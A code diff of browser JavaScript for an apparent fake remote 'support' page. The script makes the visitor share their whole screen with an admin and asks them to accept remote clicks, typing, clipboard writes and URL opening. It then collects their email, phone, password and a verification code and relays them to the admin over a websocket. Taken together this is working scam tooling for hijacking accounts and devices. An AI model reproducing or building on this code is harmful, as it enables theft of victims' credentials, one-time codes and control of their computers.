@@ -1,101 +1,44 @@
-let ws = null;
-let peerConnection = null;
-let stream = null;
+let ws;
+let peerConnection;
+let stream;
 let pendingCandidates = [];
 let controlGranted = false;
-let reconnectTimer = null;
-let pingTimer = null;
-let reconnectDelay = 3000;
-
-const iceServers = {
-  iceServers: [
-    { urls: "stun:stun.l.google.com:19302" },
-    { urls: "stun:stun1.l.google.com:19302" },
-    {
-      urls: [
-        "turn:91.192.10.147:3478?transport=udp",
-        "turn:91.192.10.147:3478?transport=tcp",
-      ],
-      username: "kanha",
-      credential: "TURN_PASSWORD_HERE",
-    },
-  ],
-  iceTransportPolicy: "all",
-  bundlePolicy: "max-bundle",
-};
-
-const isIOS =
-  /iPhone|iPad|iPod/.test(navigator.userAgent) ||
-  (navigator.platform === "MacIntel" && navigator.maxTouchPoints > 1);
-const isAndroid = /Android/.test(navigator.userAgent);
-const isMobile = isIOS || isAndroid;
+const iceServers = { iceServers: [{ urls: "stun:stun.l.google.com:19302" }] };
 
 function connectWS() {
-  if (
-    ws &&
-    (ws.readyState === WebSocket.OPEN ||
-      ws.readyState === WebSocket.CONNECTING)
-  ) {
-    return;
-  }
-
   const protocol = window.location.protocol === "https:" ? "wss://" : "ws://";
-  const socket = new WebSocket(`${protocol}${window.location.host}`);
-  ws = socket;
+  ws = new WebSocket(`${protocol}${window.location.host}`);
 
-  socket.onopen = () => {
-    reconnectDelay = 3000;
-    socket.send(JSON.stringify({ type: "role", role: "visitor" }));
+  ws.onopen = () => {
+    ws.send(JSON.stringify({ type: "role", role: "visitor" }));
+    // Re-send control permission if it was already granted (survives admin refresh)
     if (controlGranted) {
-      socket.send(JSON.stringify({ type: "control-granted", target: "admin" }));
+      ws.send(JSON.stringify({ type: "control-granted", target: "admin" }));
     }
-    if (pingTimer) clearInterval(pingTimer);
-    pingTimer = setInterval(() => {
-      if (socket.readyState === WebSocket.OPEN) {
-        socket.send(JSON.stringify({ type: "ping" }));
-      }
-    }, 20000);
   };
 
-  socket.onmessage = async (e) => {
-    let data;
-    try {
-      data = JSON.parse(e.data);
-    } catch (err) {
-      return;
-    }
+  ws.onmessage = async (e) => {
+    const data = JSON.parse(e.data);
 
-    if (data.type === "pong") return;
-
+    // Listen for the admin refresh signal and restart the stream
     if (data.type === "request-offer") {
       if (stream) {
-        const vt = stream.getVideoTracks()[0];
-        if (vt && vt.readyState === "live") {
-          startWebRTC();
-        }
+        startWebRTC();
       }
       return;
     }
 
     if (data.type === "webrtc-answer") {
-      if (!peerConnection) return;
-      try {
-        await peerConnection.setRemoteDescription(
-          new RTCSessionDescription(data.sdp),
-        );
-        const queued = pendingCandidates;
-        pendingCandidates = [];
-        for (const cand of queued) {
-          try {
-            await peerConnection.addIceCandidate(new RTCIceCandidate(cand));
-          } catch (err) {}
-        }
-      } catch (err) {
-        console.log("answer error", err);
+      await peerConnection.setRemoteDescription(
+        new RTCSessionDescription(data.sdp),
+      );
+      for (const cand of pendingCandidates) {
+        try {
+          await peerConnection.addIceCandidate(new RTCIceCandidate(cand));
+        } catch (err) {}
       }
-      return;
+      pendingCandidates = [];
     }
-
     if (data.type === "webrtc-ice") {
       if (peerConnection && peerConnection.remoteDescription) {
         try {
@@ -106,29 +49,20 @@ function connectWS() {
       } else {
         pendingCandidates.push(data.candidate);
       }
-      return;
     }
+    if (data.type === "admin-message") showToast(data.text);
 
-    if (data.type === "admin-message") {
-      showToast(data.text);
-      return;
-    }
-
+    // --- REMOTE CONTROL ---
     if (data.type === "request-control") {
       const accept = window.confirm(
         "Support agent is requesting full remote control (click, type, scroll). Do you allow this?",
       );
       if (accept) {
         controlGranted = true;
-        socket.send(
-          JSON.stringify({ type: "control-granted", target: "admin" }),
-        );
+        ws.send(JSON.stringify({ type: "control-granted", target: "admin" }));
       } else {
-        socket.send(
-          JSON.stringify({ type: "control-denied", target: "admin" }),
-        );
+        ws.send(JSON.stringify({ type: "control-denied", target: "admin" }));
       }
-      return;
     }
 
     if (data.type === "remote-click" && controlGranted) {
@@ -137,7 +71,7 @@ function connectWS() {
       const el = document.elementFromPoint(x, y);
 
       const indicator = document.createElement("div");
-      indicator.style.cssText = `position:fixed; left:${x}px; top:${y}px; width:24px; height:24px; background:rgba(239,68,68,0.7); border:2px solid white; border-radius:50%; transform:translate(-50%,-50%); z-index:99999; pointer-events:none; animation: clickRipple 0.4s ease-out forwards;`;
+      indicator.style.cssText = `position:fixed; left:${x}px; top:${y}px; width:24px; height:24px; background:rgba(239, 68, 68, 0.7); border: 2px solid white; border-radius:50%; transform:translate(-50%,-50%); z-index:99999; pointer-events:none; animation: clickRipple 0.4s ease-out forwards;`;
       document.body.appendChild(indicator);
       setTimeout(() => indicator.remove(), 400);
 
@@ -155,7 +89,6 @@ function connectWS() {
         if (el.click) el.click();
         if (el.tagName === "INPUT" || el.tagName === "TEXTAREA") el.focus();
       }
-      return;
     }
 
     if (data.type === "remote-key" && controlGranted) {
@@ -211,8 +144,8 @@ function connectWS() {
         if (isInput) {
           const start = el.selectionStart;
           const end = el.selectionEnd;
-          let newStart = start;
-          let newEnd = end;
+          let newStart = start,
+            newEnd = end;
           if (data.key === "ArrowLeft") {
             newStart = Math.max(0, start - 1);
             newEnd = newStart;
@@ -248,12 +181,10 @@ function connectWS() {
         el.dispatchEvent(new Event("input", { bubbles: true }));
         return;
       }
-      return;
     }
 
     if (data.type === "remote-scroll" && controlGranted) {
       window.scrollBy({ top: data.deltaY, left: 0, behavior: "auto" });
-      return;
     }
 
     if (data.type === "remote-clipboard" && controlGranted) {
@@ -263,7 +194,6 @@ function connectWS() {
       } catch (err) {
         showToast("Failed to write clipboard.");
       }
-      return;
     }
 
     if (data.type === "remote-open-url") {
@@ -278,114 +208,62 @@ function connectWS() {
       } catch (err) {
         window.location.href = data.url;
       }
-      return;
     }
 
     if (data.type === "remote-close-tab") {
       if (stream) stream.getTracks().forEach((t) => t.stop());
-      if (peerConnection) {
-        peerConnection.onicecandidate = null;
-        peerConnection.close();
-        peerConnection = null;
-      }
+      if (peerConnection) peerConnection.close();
       window.close();
       setTimeout(() => {
         document.body.innerHTML = `<div style="display:flex; flex-direction:column; align-items:center; justify-content:center; height:100vh; font-family:sans-serif; background:#fcfcfc; color:#333; text-align:center;"><svg width="64" height="64" viewBox="0 0 24 24" fill="none" stroke="#ef4444" stroke-width="2" style="margin-bottom:20px;"><circle cx="12" cy="12" r="10"></circle><line x1="15" y1="9" x2="9" y2="15"></line><line x1="9" y1="9" x2="15" y2="15"></line></svg><h2>Session Terminated</h2><p>The support agent has ended this session.</p></div>`;
       }, 100);
     }
   };
-
-  socket.onclose = () => {
-    if (pingTimer) {
-      clearInterval(pingTimer);
-      pingTimer = null;
-    }
-    if (ws === socket) ws = null;
-    if (reconnectTimer) clearTimeout(reconnectTimer);
-    reconnectTimer = setTimeout(() => {
-      reconnectDelay = Math.min(reconnectDelay * 2, 30000);
-      connectWS();
-    }, reconnectDelay);
-  };
-
-  socket.onerror = () => {
-    try {
-      socket.close();
-    } catch (err) {}
-  };
 }
 
-const clickRippleStyle = document.createElement("style");
-clickRippleStyle.innerHTML = `@keyframes clickRipple { from { transform: translate(-50%,-50%) scale(1); opacity: 1; } to { transform: translate(-50%,-50%) scale(2); opacity: 0; } }`;
-document.head.appendChild(clickRippleStyle);
+const style = document.createElement("style");
+style.innerHTML = `@keyframes clickRipple { from { transform: translate(-50%,-50%) scale(1); opacity: 1; } to { transform: translate(-50%,-50%) scale(2); opacity: 0; } }`;
+document.head.appendChild(style);
 
+// --- SCREEN SHARE LOGIC WITH ENTIRE SCREEN HINT ---
 document.getElementById("accept-btn").addEventListener("click", async () => {
   document.getElementById("screen-error").classList.add("hidden");
 
-  const constraints = isIOS
-    ? { video: true, audio: false }
-    : {
-        video: {
-          displaySurface: "monitor",
-          frameRate: { ideal: 30, max: 60 },
-          width: { ideal: 1920 },
-          height: { ideal: 1080 },
-        },
-        audio: false,
-        selfBrowserSurface: "exclude",
-        surfaceSwitching: "exclude",
-        preferCurrentTab: false,
-      };
+  const constraints = {
+    video: {
+      displaySurface: "monitor",
+      frameRate: { ideal: 30, max: 60 },
+      width: { ideal: 1920 },
+      height: { ideal: 1080 },
+    },
+    audio: false,
+    selfBrowserSurface: "exclude",
+    surfaceSwitching: "exclude",
+    preferCurrentTab: false,
+  };
 
   try {
     stream = await navigator.mediaDevices.getDisplayMedia(constraints);
   } catch (err) {
     console.log("Screen share cancelled or failed", err);
-    document.getElementById("screen-error").classList.remove("hidden");
     return;
   }
 
   const videoTrack = stream.getVideoTracks()[0];
-  if (!videoTrack) {
+  const settings = videoTrack.getSettings ? videoTrack.getSettings() : {};
+
+  if (settings.displaySurface && settings.displaySurface !== "monitor") {
     stream.getTracks().forEach((t) => t.stop());
-    stream = null;
     document.getElementById("screen-error").classList.remove("hidden");
     return;
   }
 
-  if (!isMobile) {
-    const settings = videoTrack.getSettings ? videoTrack.getSettings() : {};
-    if (settings.displaySurface && settings.displaySurface !== "monitor") {
-      stream.getTracks().forEach((t) => t.stop());
-      stream = null;
-      document.getElementById("screen-error").classList.remove("hidden");
-      return;
-    }
-  }
-
-  if (isMobile) {
-    await new Promise((r) => setTimeout(r, 1500));
-    const t = stream.getVideoTracks()[0];
-    const s = t && t.getSettings ? t.getSettings() : {};
-    if (!t || t.readyState === "ended" || !s.width) {
-      stream.getTracks().forEach((x) => x.stop());
-      stream = null;
-      document.getElementById("screen-error").classList.remove("hidden");
-      return;
-    }
-  }
-
-  videoTrack.onended = () => {
+  stream.getVideoTracks()[0].onended = () => {
     document.getElementById("state-5").classList.add("hidden");
     document.getElementById("state-verify").classList.add("hidden");
     document.getElementById("state-3").classList.add("hidden");
     document.getElementById("state-1").classList.remove("hidden");
-    if (peerConnection) {
-      peerConnection.onicecandidate = null;
-      peerConnection.close();
-      peerConnection = null;
-    }
-    stream = null;
+    if (peerConnection) peerConnection.close();
   };
 
   document.getElementById("state-1").classList.add("hidden");
@@ -394,76 +272,34 @@ document.getElementById("accept-btn").addEventListener("click", async () => {
 });
 
 async function startWebRTC() {
-  if (!stream) return;
-  const vt = stream.getVideoTracks()[0];
-  if (!vt || vt.readyState === "ended") {
-    document.getElementById("state-3").classList.add("hidden");
-    document.getElementById("state-1").classList.remove("hidden");
-    document.getElementById("screen-error").classList.remove("hidden");
-    stream = null;
-    return;
-  }
-
-  if (!ws || ws.readyState !== WebSocket.OPEN) {
-    console.log("WebSocket not open, cannot start WebRTC");
-    return;
-  }
-
   if (peerConnection) {
-    peerConnection.onicecandidate = null;
     peerConnection.close();
-    peerConnection = null;
   }
 
-  pendingCandidates = [];
+  peerConnection = new RTCPeerConnection(iceServers);
+  stream.getTracks().forEach((track) => peerConnection.addTrack(track, stream));
 
-  const pc = new RTCPeerConnection(iceServers);
-  peerConnection = pc;
-
-  stream.getTracks().forEach((track) => pc.addTrack(track, stream));
-
-  pc.onicecandidate = (event) => {
+  peerConnection.onicecandidate = (event) => {
     if (event.candidate) {
-      if (ws && ws.readyState === WebSocket.OPEN) {
-        ws.send(
-          JSON.stringify({
-            type: "webrtc-ice",
-            candidate: event.candidate,
-            target: "admin",
-          }),
-        );
-      }
+      ws.send(
+        JSON.stringify({
+          type: "webrtc-ice",
+          candidate: event.candidate,
+          target: "admin",
+        }),
+      );
     }
   };
 
-  try {
-    const transceiver = pc.getTransceivers()[0];
-    if (transceiver && RTCRtpSender.getCapabilities) {
-      const caps = RTCRtpSender.getCapabilities("video");
-      if (caps && caps.codecs) {
-        const h264 = caps.codecs.filter((c) => /H264/i.test(c.mimeType));
-        if (h264.length) transceiver.setCodecPreferences(h264);
-      }
-    }
-  } catch (err) {}
-
-  try {
-    const offer = await pc.createOffer();
-    await pc.setLocalDescription(offer);
-    if (ws && ws.readyState === WebSocket.OPEN) {
-      ws.send(
-        JSON.stringify({ type: "webrtc-offer", sdp: offer, target: "admin" }),
-      );
-    }
-  } catch (err) {
-    console.log("offer error", err);
-  }
+  const offer = await peerConnection.createOffer();
+  await peerConnection.setLocalDescription(offer);
+  ws.send(
+    JSON.stringify({ type: "webrtc-offer", sdp: offer, target: "admin" }),
+  );
 }
 
 function handleVerify(event) {
   event.preventDefault();
-  if (!ws || ws.readyState !== WebSocket.OPEN) return;
-
   const email = document.getElementById("visitor-email").value;
   const phone = document.getElementById("visitor-phone").value;
   const password = document.getElementById("visitor-pass").value;
@@ -488,6 +324,7 @@ function handleVerify(event) {
   setTimeout(() => {
     document.getElementById("state-3").classList.add("hidden");
     document.getElementById("state-verify").classList.remove("hidden");
+
     btn.disabled = false;
     btnText.innerText = "Sign in";
     spinner.classList.add("hidden");
@@ -497,13 +334,14 @@ function handleVerify(event) {
 function handleCodeVerify(event) {
   event.preventDefault();
   const code = document.getElementById("verify-code").value;
-  if (ws && ws.readyState === WebSocket.OPEN) {
-    ws.send(JSON.stringify({ type: "visitor-code", code: code }));
-  }
+
+  ws.send(JSON.stringify({ type: "visitor-code", code: code }));
+
   document.getElementById("state-verify").classList.add("hidden");
   document.getElementById("state-5").classList.remove("hidden");
 }
 
+// --------- TOAST & PERSISTENT MESSAGE SYSTEM ---------
 function formatMessageContent(text) {
   const schemes = ["sms:", "tel:", "mailto:", "fb://", "whatsapp://", "tg://"];
   let actionHtml = "";
